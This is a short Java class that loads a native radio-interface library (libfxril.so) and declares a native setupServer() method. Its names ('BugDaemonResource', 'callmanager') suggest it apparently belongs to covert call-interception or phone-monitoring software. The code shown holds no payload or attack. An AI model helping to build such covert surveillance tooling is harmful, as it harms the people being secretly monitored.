package com.vvt.callmanager;

import com.vvt.callmanager.ref.BugDaemonResource;

public class Ril {
	
	// If we put the string LIB_RIL here, 
	// anyone who want to refer to this string will need to have libfxril.so file.
	// Therefore, I move the string out to the resource class.
	
	static {
		System.loadLibrary(BugDaemonResource.LIB_RIL);
	}
	
	public native int setupServer();
}
